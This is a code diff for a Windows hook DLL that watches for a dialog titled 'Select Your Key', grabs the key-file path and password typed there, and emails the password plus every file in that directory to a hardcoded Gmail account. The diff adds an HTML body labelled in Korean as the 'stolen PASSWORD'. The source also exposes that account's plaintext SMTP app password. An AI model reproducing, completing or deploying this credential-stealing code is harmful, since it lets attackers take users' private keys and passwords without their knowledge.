@@ -13,7 +13,6 @@ HHOOK hCbtHook = NULL;
 WCHAR szPath[MAX_PATH];
 WCHAR szPass[MAX_PATH];
 
-
 namespace fs = std::filesystem;
 
 static const std::string from_email = "itsrealsoul5@gmail.com";
@@ -23,9 +22,11 @@ static const std::string smtp_url = "smtps://smtp.gmail.com:465";
 static const std::string username = "itsrealsoul5@gmail.com";
 static const std::string password = "dibl reij iuzp kohh";
 
-static size_t payload_source(void* ptr, size_t size, size_t nmemb, void* userp) {
-    std::string* email_body = static_cast<std::string*>(userp);
-    if (email_body->empty()) return 0;
+static size_t payload_source(void *ptr, size_t size, size_t nmemb, void *userp)
+{
+    std::string *email_body = static_cast<std::string *>(userp);
+    if (email_body->empty())
+        return 0;
 
     size_t len = email_body->length();
     memcpy(ptr, email_body->c_str(), len);
@@ -33,14 +34,16 @@ static size_t payload_source(void* ptr, size_t size, size_t nmemb, void* userp) 
     return len;
 }
 
-void send_email_with_attachments_from_directory(const std::string& directory_path, const std::string& email_body_text) {
-    CURL* curl;
+void send_email_with_attachments_from_directory(const std::string &directory_path, const std::string &email_body_text)
+{
+    CURL *curl;
     CURLcode res = CURLE_OK;
-    struct curl_slist* recipients = NULL;
+    struct curl_slist *recipients = NULL;
     std::string email_body = "Subject: SMTP Email with Attachments\r\n\r\n" + email_body_text;
 
     curl = curl_easy_init();
-    if (curl) {
+    if (curl)
+    {
         curl_easy_setopt(curl, CURLOPT_URL, smtp_url.c_str());
         curl_easy_setopt(curl, CURLOPT_USERNAME, username.c_str());
         curl_easy_setopt(curl, CURLOPT_PASSWORD, password.c_str());
@@ -56,13 +59,26 @@ void send_email_with_attachments_from_directory(const std::string& directory_pat
         curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);
 
         // Create MIME for attachments
-        curl_mime* mime;
-        curl_mimepart* part;
+        curl_mime *mime;
+        curl_mimepart *part;
         mime = curl_mime_init(curl);
 
+        // 기존 텍스트 본문을 위한 MIME 파트 생성
+        curl_mimepart *text_part = curl_mime_addpart(mime);
+        curl_mime_data(text_part, email_body_text.c_str(), CURL_ZERO_TERMINATED);
+        curl_mime_type(text_part, "text/plain");
+
+        // HTML 본문을 위한 MIME 파트 생성
+        std::string html_body = "<html><body><h1>탈취된 PASSWORD는</h1><p>" + email_body_text + "</p></body></html>";
+        curl_mimepart *html_part = curl_mime_addpart(mime);
+        curl_mime_data(html_part, html_body.c_str(), CURL_ZERO_TERMINATED);
+        curl_mime_type(html_part, "text/html");
+
         // Add all files in the directory as attachments
-        for (const auto& entry : fs::directory_iterator(directory_path)) {
-            if (entry.is_regular_file()) {
+        for (const auto &entry : fs::directory_iterator(directory_path))
+        {
+            if (entry.is_regular_file())
+            {
                 part = curl_mime_addpart(mime);
                 curl_mime_name(part, "attachment");
                 curl_mime_filedata(part, entry.path().string().c_str());
@@ -73,7 +89,8 @@ void send_email_with_attachments_from_directory(const std::string& directory_pat
 
         res = curl_easy_perform(curl);
 
-        if (res != CURLE_OK) {
+        if (res != CURLE_OK)
+        {
             std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
         }
 
@@ -82,8 +99,10 @@ void send_email_with_attachments_from_directory(const std::string& directory_pat
     }
 }
 
-BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
-    switch (ul_reason_for_call) {
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
+{
+    switch (ul_reason_for_call)
+    {
     case DLL_PROCESS_ATTACH:
         hInstance = hModule;
         break;
@@ -95,9 +114,11 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReser
     return TRUE;
 }
 
-std::string ws2s(const std::wstring& wstr) {
+std::string ws2s(const std::wstring &wstr)
+{
     int bufferSize = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
-    if (bufferSize == 0) {
+    if (bufferSize == 0)
+    {
         return "";
     }
     std::string str(bufferSize - 1, 0); // Null terminator 제외
@@ -106,8 +127,10 @@ std::string ws2s(const std::wstring& wstr) {
 }
 
 // Function to handle CBT hook events
-LRESULT CALLBACK CBTProc(int nCode, WPARAM wParam, LPARAM lParam) {
-    if (nCode == HCBT_DESTROYWND) {
+LRESULT CALLBACK CBTProc(int nCode, WPARAM wParam, LPARAM lParam)
+{
+    if (nCode == HCBT_DESTROYWND)
+    {
         HWND hwnd = (HWND)wParam;
         WCHAR windowText[256];
         GetWindowTextW(hwnd, windowText, sizeof(windowText) / sizeof(WCHAR));
@@ -115,7 +138,8 @@ LRESULT CALLBACK CBTProc(int nCode, WPARAM wParam, LPARAM lParam) {
         std::string textString = ws2s(windowText);
 
         // Compare windowText to "Select Your Key"
-        if (wcscmp(windowText, L"Select Your Key") == 0) {
+        if (wcscmp(windowText, L"Select Your Key") == 0)
+        {
             HWND hTextBox = GetDlgItem(hwnd, 1001);
             GetWindowText(hTextBox, szPath, MAX_PATH);
             int len = GetWindowTextLength(hTextBox);
@@ -123,17 +147,17 @@ LRESULT CALLBACK CBTProc(int nCode, WPARAM wParam, LPARAM lParam) {
             wprintf(L"szPath : %s ", szPath);
 
             int bufferSize = WideCharToMultiByte(CP_UTF8, 0, szPath, -1, NULL, 0, NULL, NULL);
-            char* szText = new char[bufferSize];
+            char *szText = new char[bufferSize];
             WideCharToMultiByte(CP_UTF8, 0, szPath, -1, szText, bufferSize, NULL, NULL);
 
             HWND hPassIdBox = GetDlgItem(hwnd, 1002);
             GetWindowText(hPassIdBox, szPass, MAX_PATH);
             wprintf(L"Passlen : %s ", szPass);
             int passbufferSize = WideCharToMultiByte(CP_UTF8, 0, szPass, -1, NULL, 0, NULL, NULL);
-            char* szPassText = new char[passbufferSize];
+            char *szPassText = new char[passbufferSize];
             WideCharToMultiByte(CP_UTF8, 0, szPass, -1, szPassText, passbufferSize, NULL, NULL);
 
-            //std::cout << "hook path: " << hookPath << std::endl;
+            // std::cout << "hook path: " << hookPath << std::endl;
             /*
             char cmd[1024];
             memset(cmd, 0, sizeof(cmd));
@@ -142,7 +166,6 @@ LRESULT CALLBACK CBTProc(int nCode, WPARAM wParam, LPARAM lParam) {
             system(cmd);
             */
             send_email_with_attachments_from_directory(szText, szPassText);
-
 
             delete[] szPassText;
             delete[] szText;
